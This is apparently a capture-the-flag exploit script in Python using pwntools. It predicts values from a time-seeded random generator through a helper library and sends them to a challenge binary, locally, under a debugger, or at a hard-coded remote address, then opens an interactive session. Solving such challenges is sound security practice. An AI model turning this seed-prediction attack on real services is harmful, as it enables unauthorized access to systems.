#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL
from time import time

context.log_level = 'info'
context.binary = elf = ELF('./chall')
context.terminal = ['alacritty', '-e']

lib = CDLL('./random_lib.so')
seed = int(time()) + 2
print("Seed : " + str(seed))
lib.setseed(int(time()) + 1)
data = [ lib.generate() for _ in range(16) ]

gs = """
b *main+132
continue
"""
if args.REMOTE:
    io = remote("84.201.137.163", 10160)
elif args.GDB:
    io = gdb.debug('./chall', gdbscript=gs)
else:
    io = process()

for d in data:
    print("%02x" % d)

for n in data:
    io.sendline(str(n).encode())

io.interactive()
io.close()
